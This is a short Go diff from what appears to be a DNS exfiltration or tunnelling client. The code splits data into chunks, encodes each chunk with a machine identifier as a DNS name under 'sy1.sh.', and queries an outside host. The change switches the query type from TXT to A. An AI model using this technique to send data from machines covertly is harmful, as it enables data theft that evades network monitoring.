@@ -53,7 +53,7 @@ func main() {
 						chunkUrl := currentChunk + "-" + chunkLen + "." + machineId + "." + chunkOut + ".sy1.sh."
 
 						fmt.Println(chunkUrl)
-						nm.SetQuestion(chunkUrl, dns.TypeTXT)
+						nm.SetQuestion(chunkUrl, dns.TypeA)
 						dns.Exchange(nm, host)
 					}
 				}
